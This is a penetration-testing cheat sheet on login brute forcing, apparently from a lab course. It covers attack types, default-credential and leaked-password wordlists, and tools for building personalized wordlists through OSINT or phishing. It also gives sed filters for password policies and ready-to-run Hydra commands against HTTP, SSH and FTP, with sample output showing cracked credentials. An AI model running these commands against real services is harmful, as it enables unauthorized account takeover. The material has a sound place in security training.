# <a id="top-of-page"></a> Login Brute Forcing

## Attack Tools

## General Information on Brute-forcing

### Attack Types

| **Attack**                 | **Description**                                                                                                             |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Online Brute Force Attack  | Attacking a live application over the network, like HTTP, HTTPs, SSH, FTP, and others                                       |
|                            |
| Offline Brute Force Attack | Also known as Offline Password Cracking, where you attempt to crack a hash of an encrypted password.                        |
|                            |
| Reverse Brute Force Attack | Also known as username brute-forcing, where you try a single common password with a list of usernames on a certain service. |
|                            |
| Hybrid Brute Force Attack  | Attacking a user by creating a customized password wordlist, built using known intelligence about the user or the service.  |
|                            |
| Dictionary Attack          | tries to guess passwords with the help of lists. The goal is to use a list of known passwords to guess an unknown password. |

### Default Credentials

It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. test:test-, and scan those first. If no results are found, than usage of seperate wordlists for username & password can be tried.

Wordlists of Default Credentials can be found at [SecLists](https://github.com/danielmiessler/SecLists).

--Example (Hydra)--

```
Anon4Now@ATTACKER[/ATTACKER]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

| **Options**                        | **Description**                        |
| ---------------------------------- | -------------------------------------- |
| `-C ftp-betterdefaultpasslist.txt` | flag for Combined Credentials Wordlist |
| `SERVER_IP`                        | Target IP                              |
| `-s PORT`                          | flag for Target Port                   |
| `http-get`                         | Request Method                         |
| `/`                                | Target Path                            |

### Personalized Wordlists (Hybrid Brute-force attack)

Creating a personalized wordlist for a targeted user is more efficient than just performing a pure brute-force attack. To create a customized wordlist for a user, information gathering is imperative whether it be through OSINT or Phishing.

#### ---Tools for custom wordlists---

Always check to see if your distro already has these installed.

- [CUPP - installed on most hacking distros](https://github.com/Mebus/cupp)
- [CeWL - crawls websites for wordlist](https://github.com/digininja/CeWL)
- [Combinator - combines common words in a wordlist](https://sourceforge.net/projects/combinator/)
- [Crunch - combines wordlists with mask attacks](https://sourceforge.net/projects/crunch-wordlist/)
- [rsmangler - good for word mangling](https://github.com/digininja/RSMangler)
- [The Mentalist - good for word mangling](https://github.com/sc0tfree/mentalist.git)
- [Username Anarchy - good for custom username wordlist](https://github.com/urbanadventurer/username-anarchy)

#### ---Linux commands to meet password policies---

Sometimes during information gathering it can be determined what the targets password policies are. This information can guide the brute-force attack by allowing for wordlists to be curtailed to the specifications. Below are some Linux commands that can alter a wordlist to match the password policy specifications (e.g., Password must have 1 special char, 1 number, and be a length of 8 chars):

| **Command**                                    | **Description**                                                                  |
| ---------------------------------------------- | -------------------------------------------------------------------------------- |
| `sed -ri '/^.{,7}$/d' wordlist.txt`            | Remove shorter than 8 characters (edit the {,7} part to change this requirement) |
| `sed -ri '/[!-/:-@\[-`\{-~]+/!d' wordlist.txt` | Remove no special characters                                                     |
| `sed -ri '/[0-9]+/!d'`                         | Remove no numbers                                                                |

## General Information on Hydra

### Hydra Modules

Hydra provides many different types of requests that can be used to brute force different services. The command below will generate a curates list of all supported services.

| **Command**                                                                        | **Description**                                 |
| ---------------------------------------------------------------------------------- | ----------------------------------------------- |
| `hydra -h \| grep "Supported services" \| tr ":" "\n" \| tr " " "\n" \| column -e` | Generates a list of supported services by Hydra |

### Password and/or Username Brute Force

To brute force a username and/or password with Hydra, the use of the -L flag (usernames) and the -P flag (passwords) will be used.

--Example-- (Hydra)

```
Anon4Now@ATTACKER[/ATTACKER]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
[DATA] attacking http-get://178.35.49.134:32901/
[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active

<...SNIP...>
[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1

[STATUS] attack finished for SERVER_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

| **Options** | **Description**                                   |
| ----------- | ------------------------------------------------- |
| `-L`        | flag for the usernames wordlist                   |
| `-P`        | flag for the passwords wordlist                   |
| `-f`        | flag to stop after the first successful login     |
| `-u`        | flag, so that it tries all users on each password |
| `SERVER_IP` | Target IP                                         |
| `-s PORT`   | flag for Target Port                              |
| `http-get`  | Request Method                                    |
| `/`         | Target Path                                       |

## Service Auth Brute Forcing

Using Hydra to brute-force services is relatively straight-forward. Examples are below:

| **Command**                                                        | **Description**                              |
| ------------------------------------------------------------------ | -------------------------------------------- |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists        |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`               | FTP Brute Force - Static User, Pass Wordlist |

## Useful Wordlists

| **Wordlist**                                                                       | **Description**            |
| ---------------------------------------------------------------------------------- | -------------------------- |
| `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`                      | Common Passwords Wordlist  |
| `/opt/useful/SecLists/Usernames/Names/names.txt`                                   | Common Names Wordlist      |
